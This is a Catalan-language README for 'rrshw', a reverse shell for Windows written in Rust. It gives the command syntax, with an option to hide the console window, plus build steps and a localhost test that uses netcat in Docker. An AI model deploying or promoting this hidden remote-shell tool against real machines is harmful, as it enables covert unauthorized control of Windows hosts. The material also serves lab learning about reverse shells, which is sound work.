## rrshw - Rust Reverse Shell for Windows 
Que és una Reverse Shell? (https://en.wikipedia.org/wiki/Shell_shoveling)[https://en.wikipedia.org/wiki/Shell_shoveling].

Utilització: **rrshw.exe [ip] [port] [invisible(y/n=default)]**

Exemple: **rrshw.exe 127.0.0.1 4444 y**

**Complilar a partir del codi font**

git clone https://github.com/jc4st3lls/rrshw.git

cd rrshw

cargo build --release 

(a la carpeta bin hi ha una versió compilada)

**Com provar**

Dins la carpeta Netcat he deixat el nesessari per engegar un netcat dins un contanier docker per tal de simular un servidor remot. Seguin les pases del document Help.txt i posteriorment des d'una consola windows executem l'exemple **rrshw.exe 127.0.0.1 4444 y**, veurem com en el contenidor apareix una consola cmd de windows. Proveu també sens el paràmetre 'y' per entendre la seva utilitat.
